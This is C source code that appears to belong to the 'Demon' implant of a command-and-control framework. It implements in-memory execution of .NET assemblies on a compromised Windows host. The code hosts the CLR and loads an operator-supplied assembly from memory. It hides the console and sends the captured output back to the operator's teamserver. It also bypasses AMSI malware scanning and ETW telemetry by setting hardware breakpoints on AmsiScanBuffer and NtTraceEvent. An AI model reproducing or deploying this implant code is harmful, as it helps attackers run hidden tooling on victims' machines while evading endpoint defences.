#include <Demon.h>

#include <core/MiniStd.h>
#include <core/Dotnet.h>
#include <core/HwBpExceptions.h>
#include <core/Runtime.h>

/* Named-pipe buffer size. Sized generously so short-running assemblies
 * never have to wait for the drain loop to consume anything. */
#define PIPE_BUFFER 0x10000 * 5

/* How long the main thread parks between drain passes while Invoke_3 runs
 * on the worker thread. Small enough to keep output flowing, large enough
 * that we don't burn CPU. */
#define DOTNET_DRAIN_INTERVAL_MS 100

GUID xCLSID_CLRMetaHost     = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
GUID xCLSID_CorRuntimeHost  = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
GUID xIID_AppDomain         = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
GUID xIID_ICLRMetaHost      = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
GUID xIID_ICLRRuntimeInfo   = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
GUID xIID_ICorRuntimeHost   = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };

BOOL AmsiPatched = FALSE;

/* Worker thread that actually invokes the assembly entry point.
 * We move Invoke_3 off the beacon thread so the main thread can keep
 * draining the output pipe while the assembly runs — otherwise a chatty
 * assembly can fill the pipe buffer and deadlock the whole demon. */
DWORD WINAPI DotnetInvokeThreadProc( LPVOID lpParam )
{
    VARIANT Object = { 0 };
    HRESULT hr     = S_OK;

    if ( ! Instance->Dotnet || ! Instance->Dotnet->MethodInfo ) {
        return (DWORD) E_FAIL;
    }

    hr = Instance->Dotnet->MethodInfo->lpVtbl->Invoke_3(
        Instance->Dotnet->MethodInfo,
        Object,
        Instance->Dotnet->MethodArgs,
        &Instance->Dotnet->Return );

    Instance->Dotnet->InvokeResult = hr;

    return (DWORD) hr;
}

BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
{
    PPACKAGE       PackageInfo    = NULL;
    SAFEARRAYBOUND RgsBound[ 1 ]  = { 0 };
    BUFFER         AssemblyData   = { 0 };
    LPWSTR*        ArgumentsArray = NULL;
    INT            ArgumentsCount = 0;
    LONG           idx[ 1 ]       = { 0 };
    NTSTATUS       Status         = STATUS_SUCCESS;
    DWORD          ThreadId       = 0;
    HRESULT        Result         = S_OK;
    BOOL           AmsiIsLoaded   = FALSE;
    HANDLE         hInvokeThread  = NULL;

    if ( ! Assembly.Buffer || ! Assembly.Length )
        return FALSE;

    /* Create a named pipe for our output. */
    Instance->Dotnet->Pipe = Instance->Win32.CreateNamedPipeW(
        Instance->Dotnet->PipeName.Buffer,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
        PIPE_TYPE_MESSAGE,
        PIPE_UNLIMITED_INSTANCES,
        PIPE_BUFFER, PIPE_BUFFER,
        0,
        NULL
    );

    /* CreateNamedPipeW returns INVALID_HANDLE_VALUE (not NULL) on failure. */
    if ( ! Instance->Dotnet->Pipe || Instance->Dotnet->Pipe == INVALID_HANDLE_VALUE )
    {
        PRINTF( "CreateNamedPipeW Failed: Error[%d]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32;

        Instance->Dotnet->Pipe = NULL;
        return FALSE;
    }

    Instance->Dotnet->File = Instance->Win32.CreateFileW(
        Instance->Dotnet->PipeName.Buffer,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL );

    /* CreateFileW also returns INVALID_HANDLE_VALUE on failure. */
    if ( ! Instance->Dotnet->File || Instance->Dotnet->File == INVALID_HANDLE_VALUE )
    {
        PRINTF( "CreateFileW Failed: Error[%d]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32;

        Instance->Dotnet->File = NULL;
        return FALSE;
    }

    if ( ! Instance->Win32.GetConsoleWindow( ) )
    {
        HWND wnd = NULL;

        Instance->Win32.AllocConsole( );

        if ( ( wnd = Instance->Win32.GetConsoleWindow( ) ) )
            Instance->Win32.ShowWindow( wnd, SW_HIDE );
    }

    //
    // hosting common language runtime
    //
    if ( ! ClrCreateInstance(
        Instance->Dotnet->NetVersion.Buffer,
        & Instance->Dotnet->MetaHost,
        & Instance->Dotnet->ClrRuntimeInfo,
        & Instance->Dotnet->ICorRuntimeHost
    ) ) {
        PUTS( "Couldn't start CLR" )
        return FALSE;
    }

    /* if Amsi/Etw bypass is enabled */
    if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP )
    {
#if _WIN64
        PUTS( "Try to patch(less) Amsi/Etw" )

        PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
        PackageAddInt32( PackageInfo, DOTNET_INFO_PATCHED );

        /* check if Amsi is loaded */
        AmsiIsLoaded = TRUE;
        if ( ! Instance->Modules.Amsi ) {
            AmsiIsLoaded = RtAmsi();
        }

        PUTS( "Init HwBp Engine" )
        /* use global engine */
        if ( ! NT_SUCCESS( HwBpEngineInit( NULL, NULL ) ) ) {
            return FALSE;
        }

        ThreadId = U_PTR( Instance->Teb->ClientId.UniqueThread );

        /* add Amsi bypass */
        if ( AmsiIsLoaded )
        {
            PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
            if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, Instance->Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
                PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
                return FALSE;
            }
        }

        /* add Etw bypass */
        PUTS( "HwBp Engine add NtTraceEvent bypass" )
        if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, Instance->Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 ) ) ) {
            PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
            return FALSE;
        }

        PackageTransmit( PackageInfo );
        PackageInfo = NULL;
#endif
    }
    else if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
        /* todo: add memory patching technique */
    }
    else {
        /* no patching */
    }

    /* Let the operator know what version we are going to use. */
    PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
    PackageAddInt32( PackageInfo, DOTNET_INFO_NET_VERSION );
    PackageAddBytes( PackageInfo, Instance->Dotnet->NetVersion.Buffer, Instance->Dotnet->NetVersion.Length );
    PackageTransmit( PackageInfo );
    PackageInfo = NULL;

    RgsBound[ 0 ].cElements    = Assembly.Length;
    RgsBound[ 0 ].lLbound      = 0;
    Instance->Dotnet->SafeArray = Instance->Win32.SafeArrayCreate( VT_UI1, 1, RgsBound );

    PUTS( "CreateDomain..." )
    if ( ( Result = Instance->Dotnet->ICorRuntimeHost->lpVtbl->CreateDomain( Instance->Dotnet->ICorRuntimeHost, Instance->Dotnet->AppDomainName.Buffer, NULL, &Instance->Dotnet->AppDomainThunk ) ) ) {
        PRINTF( "CreateDomain Failed: %x\n", Result )
        return FALSE;
    }

    PUTS( "QueryInterface..." )
    if ( ( Result = Instance->Dotnet->AppDomainThunk->lpVtbl->QueryInterface( Instance->Dotnet->AppDomainThunk, &xIID_AppDomain, (LPVOID*)&Instance->Dotnet->AppDomain ) ) ) {
        PRINTF( "QueryInterface Failed: %x\n", Result )
        return FALSE;
    }

    if ( ( Result = Instance->Win32.SafeArrayAccessData( Instance->Dotnet->SafeArray, &AssemblyData.Buffer ) ) ) {
        PRINTF( "SafeArrayAccessData Failed: %x\n", Result )
        return FALSE;
    }

    PUTS( "Copy assembly to buffer..." )
    MemCopy( AssemblyData.Buffer, Assembly.Buffer, Assembly.Length );

    if ( ( Result = Instance->Win32.SafeArrayUnaccessData( Instance->Dotnet->SafeArray ) ) ) {
        PRINTF("SafeArrayUnaccessData Failed: %x\n", Result )
        PACKAGE_ERROR_WIN32
    }

    PUTS( "AppDomain Load..." )
    if ( ( Result = Instance->Dotnet->AppDomain->lpVtbl->Load_3( Instance->Dotnet->AppDomain, Instance->Dotnet->SafeArray, &Instance->Dotnet->Assembly ) ) ) {
        PRINTF( "AppDomain Failed: %x\n", Result )
        return FALSE;
    }

    PUTS( "Assembly EntryPoint..." )
    if ( ( Result = Instance->Dotnet->Assembly->lpVtbl->EntryPoint( Instance->Dotnet->Assembly, &Instance->Dotnet->MethodInfo ) ) ) {
        PRINTF( "Assembly EntryPoint Failed: %x\n", Result )
        return FALSE;
    }

    /* Last field -> entryPoint == 1 is needed if Main(String[] args); 0 if Main() */
    Instance->Dotnet->MethodArgs = Instance->Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );

    ArgumentsArray = Instance->Win32.CommandLineToArgvW( Arguments.Buffer, &ArgumentsCount );
    ArgumentsArray++;
    ArgumentsCount--;

    Instance->Dotnet->vtPsa.vt     = ( VT_ARRAY | VT_BSTR );
    Instance->Dotnet->vtPsa.parray = Instance->Win32.SafeArrayCreateVector( VT_BSTR, 0, ArgumentsCount );

    for ( LONG i = 0; i < ArgumentsCount; i++ ) {
        if ( ( Result = Instance->Win32.SafeArrayPutElement( Instance->Dotnet->vtPsa.parray, &i, Instance->Win32.SysAllocString( ArgumentsArray[ i ] ) ) ) ) {
            PRINTF( "Args SafeArrayPutElement Failed: %x\n", Result )
            return FALSE;
        }
    }

    if ( ( Result = Instance->Win32.SafeArrayPutElement( Instance->Dotnet->MethodArgs, idx, &Instance->Dotnet->vtPsa ) ) ) {
        PRINTF( "SafeArrayPutElement Failed: %x\n", Result )
        return FALSE;
    }

    /* Redirect stdout AND stderr to our pipe (client end).
     * Save the originals so DotnetClose can restore them — otherwise
     * anything else in the process that later writes to stdio will
     * hit a handle that no longer exists. */
    Instance->Dotnet->StdOut = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
    Instance->Dotnet->StdErr = Instance->Win32.GetStdHandle( STD_ERROR_HANDLE );
    Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Dotnet->File );
    Instance->Win32.SetStdHandle( STD_ERROR_HANDLE, Instance->Dotnet->File );

    /* Run the entry point on a worker thread so the main thread can keep
     * draining the pipe. This is what prevents the classic 320 KB deadlock. */
    PUTS( "Invoke assembly on worker thread..." )
    Instance->Dotnet->InvokeResult = S_OK;

    Status = Instance->Win32.NtCreateThreadEx(
        &hInvokeThread,
        THREAD_ALL_ACCESS,
        NULL,
        NtCurrentProcess(),
        (LPTHREAD_START_ROUTINE) DotnetInvokeThreadProc,
        NULL,
        FALSE,                /* start immediately */
        0, 0, 0,
        NULL );

    if ( ! NT_SUCCESS( Status ) || ! hInvokeThread )
    {
        PRINTF( "NtCreateThreadEx (invoke) Failed: %08x\n", Status )

        /* Fall back to synchronous invoke — no drainer means output past
         * PIPE_BUFFER bytes may hang, but a stuck fallback is still better
         * than silently emitting nothing. */
        VARIANT ObjectLocal = { 0 };
        Instance->Dotnet->InvokeResult = Instance->Dotnet->MethodInfo->lpVtbl->Invoke_3(
            Instance->Dotnet->MethodInfo, ObjectLocal, Instance->Dotnet->MethodArgs, &Instance->Dotnet->Return );
    }
    else
    {
        Instance->Dotnet->Thread = hInvokeThread;

        /* Poll: wait a short interval for the thread to finish, then drain
         * whatever the assembly has written since the last pass. Repeat
         * until the thread exits. */
        for ( ;; )
        {
            DWORD WaitResult = Instance->Win32.WaitForSingleObjectEx(
                Instance->Dotnet->Thread,
                DOTNET_DRAIN_INTERVAL_MS,
                FALSE );

            DotnetPushPipe();

            if ( WaitResult == WAIT_OBJECT_0 )
                break;

            if ( WaitResult == WAIT_FAILED )
            {
                PRINTF( "WaitForSingleObjectEx failed: %d\n", NtGetLastError() )
                break;
            }
        }
    }

    /* Restore stdio before we start tearing anything down. */
    if ( Instance->Dotnet->StdOut ) {
        Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Dotnet->StdOut );
    }
    if ( Instance->Dotnet->StdErr ) {
        Instance->Win32.SetStdHandle( STD_ERROR_HANDLE, Instance->Dotnet->StdErr );
    }

    Instance->Dotnet->Invoked = TRUE;

    /* One last drain to catch anything the assembly emitted between the
     * final wait and thread exit. */
    DotnetPushPipe();

    if ( Instance->Dotnet->InvokeResult != S_OK )
    {
        PRINTF( "Invoke Assembly Failed: %x\n", Instance->Dotnet->InvokeResult )
        /* Report failure but don't discard the (already drained) output. */
        return FALSE;
    }

    return TRUE;
}

/* push anything from the pipe */
VOID DotnetPushPipe()
{
    DWORD Read      = 0;
    DWORD BytesRead = 0;

    if ( ! Instance->Dotnet )
        return;

    if ( ! Instance->Dotnet->Pipe || Instance->Dotnet->Pipe == INVALID_HANDLE_VALUE )
        return;

    /* see how much there is in the named pipe */
    if ( Instance->Win32.PeekNamedPipe( Instance->Dotnet->Pipe, NULL, 0, NULL, &Read, NULL ) )
    {
        if ( Read > 0 )
        {
            PRINTF( "Read: %d\n", Read );

            Instance->Dotnet->Output.Length = Read;
            Instance->Dotnet->Output.Buffer = MmHeapAlloc( Instance->Dotnet->Output.Length );

            if ( ! Instance->Dotnet->Output.Buffer )
                return;

            if ( Instance->Win32.ReadFile( Instance->Dotnet->Pipe, Instance->Dotnet->Output.Buffer, Instance->Dotnet->Output.Length, &BytesRead, NULL ) && BytesRead > 0 )
            {
                Instance->Dotnet->Output.Length = BytesRead;

                PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, Instance->Dotnet->RequestID );
                PackageAddBytes( Package, Instance->Dotnet->Output.Buffer, Instance->Dotnet->Output.Length );
                PackageTransmit( Package );
            }

            MemSet( Instance->Dotnet->Output.Buffer, 0, Read );
            MmHeapFree( Instance->Dotnet->Output.Buffer );
            Instance->Dotnet->Output.Buffer = NULL;
            Instance->Dotnet->Output.Length = 0;
        }
    }
}

VOID DotnetPush()
{
    PPACKAGE Package = NULL;
    HRESULT  Result  = S_OK;

    if ( ! Instance->Dotnet )
        return;

    PRINTF( "Instance->Dotnet->Invoked: %s\n", Instance->Dotnet->Invoked ? "TRUE" : "FALSE" )

    if ( Instance->Dotnet->Invoked )
    {
        Result = Instance->Dotnet->InvokeResult;

        /* Final drain of any bytes still sitting in the pipe buffer. */
        DotnetPushPipe();

        /* Tell the operator (and teamserver) that this request is done.
         * Teamserver keys off DOTNET_INFO_FINISHED / DOTNET_INFO_FAILED to
         * call a.RequestCompleted(RequestID), which unblocks callbacks
         * such as BofCallback and the Python DotnetInlineExecute wrappers. */
        if ( Result == S_OK )
        {
            Package = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
            PackageAddInt32( Package, DOTNET_INFO_FINISHED );
            PackageTransmit( Package );
        }
        else
        {
            Package = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
            PackageAddInt32( Package, DOTNET_INFO_FAILED );
            PackageTransmit( Package );
        }

        /* Now free everything */
        DotnetClose();
    }
}

VOID DotnetClose()
{
    if ( ! Instance->Dotnet )
        return;

#ifndef DEBUG
    Instance->Win32.FreeConsole();
#endif

    if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP ) {
        HwBpEngineDestroy( NULL );
    }

    if ( Instance->Dotnet->Event ) {
        SysNtClose( Instance->Dotnet->Event );
        Instance->Dotnet->Event = NULL;
    }

    /* Close the write-end first so any final bytes the pipe has buffered
     * get flushed to the read-end before we tear that down. */
    if ( Instance->Dotnet->File && Instance->Dotnet->File != INVALID_HANDLE_VALUE ) {
        SysNtClose( Instance->Dotnet->File );
        Instance->Dotnet->File = NULL;
    }

    if ( Instance->Dotnet->Pipe && Instance->Dotnet->Pipe != INVALID_HANDLE_VALUE ) {
        SysNtClose( Instance->Dotnet->Pipe );
        Instance->Dotnet->Pipe = NULL;
    }

    if ( Instance->Dotnet->RopInit ) {
        MemSet( Instance->Dotnet->RopInit, 0, sizeof( CONTEXT ) );
        Instance->Win32.LocalFree( Instance->Dotnet->RopInit );
        Instance->Dotnet->RopInit = NULL;
    }

    if ( Instance->Dotnet->RopInvk )
    {
        MemSet( Instance->Dotnet->RopInvk, 0, sizeof( CONTEXT ) );
        Instance->Win32.LocalFree( Instance->Dotnet->RopInvk );
        Instance->Dotnet->RopInvk = NULL;
    }

    if ( Instance->Dotnet->RopEvnt )
    {
        MemSet( Instance->Dotnet->RopEvnt, 0, sizeof( CONTEXT ) );
        Instance->Win32.LocalFree( Instance->Dotnet->RopEvnt );
        Instance->Dotnet->RopEvnt = NULL;
    }

    if ( Instance->Dotnet->RopExit )
    {
        MemSet( Instance->Dotnet->RopExit, 0, sizeof( CONTEXT ) );
        Instance->Win32.LocalFree( Instance->Dotnet->RopExit );
        Instance->Dotnet->RopExit = NULL;
    }

    PUTS( "Free Output" )
    if ( Instance->Dotnet->Output.Buffer )
    {
        MemSet( Instance->Dotnet->Output.Buffer, 0, Instance->Dotnet->Output.Length );
        Instance->Win32.LocalFree( Instance->Dotnet->Output.Buffer );
        Instance->Dotnet->Output.Buffer = NULL;
    }

    PUTS( "Unload and free CLR" )
    if ( Instance->Dotnet->MethodArgs )
    {
        Instance->Win32.SafeArrayDestroy( Instance->Dotnet->MethodArgs );
        Instance->Dotnet->MethodArgs = NULL;
    }

    if ( Instance->Dotnet->MethodInfo != NULL )
    {
        Instance->Dotnet->MethodInfo->lpVtbl->Release( Instance->Dotnet->MethodInfo );
        Instance->Dotnet->MethodInfo = NULL;
    }

    if ( Instance->Dotnet->Assembly != NULL )
    {
        Instance->Dotnet->Assembly->lpVtbl->Release( Instance->Dotnet->Assembly );
        Instance->Dotnet->Assembly = NULL;
    }

    if ( Instance->Dotnet->AppDomain )
    {
        Instance->Dotnet->AppDomain->lpVtbl->Release( Instance->Dotnet->AppDomain );
        Instance->Dotnet->AppDomain = NULL;
    }

    if ( Instance->Dotnet->AppDomainThunk != NULL )
    {
        Instance->Dotnet->AppDomainThunk->lpVtbl->Release( Instance->Dotnet->AppDomainThunk );
    }

    if ( Instance->Dotnet->ICorRuntimeHost )
    {
        Instance->Dotnet->ICorRuntimeHost->lpVtbl->UnloadDomain( Instance->Dotnet->ICorRuntimeHost, Instance->Dotnet->AppDomainThunk );
        Instance->Dotnet->ICorRuntimeHost->lpVtbl->Stop( Instance->Dotnet->ICorRuntimeHost );
        Instance->Dotnet->ICorRuntimeHost = NULL;
    }

    if ( Instance->Dotnet->ClrRuntimeInfo != NULL )
    {
        Instance->Dotnet->ClrRuntimeInfo->lpVtbl->Release( Instance->Dotnet->ClrRuntimeInfo );
        Instance->Dotnet->ClrRuntimeInfo = NULL;
    }

    if ( Instance->Dotnet->MetaHost != NULL )
    {
        Instance->Dotnet->MetaHost->lpVtbl->Release( Instance->Dotnet->MetaHost );
        Instance->Dotnet->MetaHost = NULL;
    }

    if ( Instance->Dotnet->Thread ) {
        SysNtClose( Instance->Dotnet->Thread );
        Instance->Dotnet->Thread = NULL;
    }

    if ( Instance->Dotnet->Exit ) {
        SysNtClose( Instance->Dotnet->Exit );
        Instance->Dotnet->Exit = NULL;
    }

    MemSet( Instance->Dotnet, 0, sizeof( DOTNET_ARGS ) );
    MmHeapFree( Instance->Dotnet );
    Instance->Dotnet = NULL;
}

BOOL FindVersion( PVOID Assembly, DWORD length )
{
    char* assembly_c;
    assembly_c = (char*)Assembly;
    char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

    for (int i = 0; i < length; i++)
    {
        for (int j = 0; j < 10; j++)
        {
            if (v4[j] != assembly_c[i + j])
                break;
            else
            {
                if (j == (9))
                    return 1;
            }
        }
    }

    return 0;
}

DWORD ClrCreateInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PICLRRuntimeInfo *ppClrRuntimeInfo, ICorRuntimeHost **ppICorRuntimeHost )
{
    BOOL fLoadable = FALSE;

    if ( RtMscoree() )
    {
        if ( Instance->Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost ) == S_OK )
        {
            if ( ( *ppClrMetaHost )->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo ) == S_OK )
            {
                if ( ( ( *ppClrRuntimeInfo )->lpVtbl->IsLoadable( *ppClrRuntimeInfo, &fLoadable ) == S_OK ) && fLoadable )
                {
                    //Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
                    if ( ( *ppClrRuntimeInfo )->lpVtbl->GetInterface( *ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost ) == S_OK )
                    {
                        //Start it. This is okay to call even if the CLR is already running
                        ( *ppICorRuntimeHost )->lpVtbl->Start( *ppICorRuntimeHost );
                    }
                    else
                    {
                        PRINTF("[-] ( GetInterface ) Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                        return 0;
                    }
                }
                else
                {
                    PRINTF("[-] ( IsLoadable ) Process refusing to load %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                    return 0;
                }
            }
            else
            {
                PRINTF("[-] ( GetRuntime ) Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                return 0;
            }
        }
        else
        {
            PRINTF("[-] ( CLRCreateInstance ) Process refusing to create %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
            return 0;
        }
    }
    else
    {
        PUTS("Failed to load mscoree.dll")
        return 0;
    }

    return 1;
}
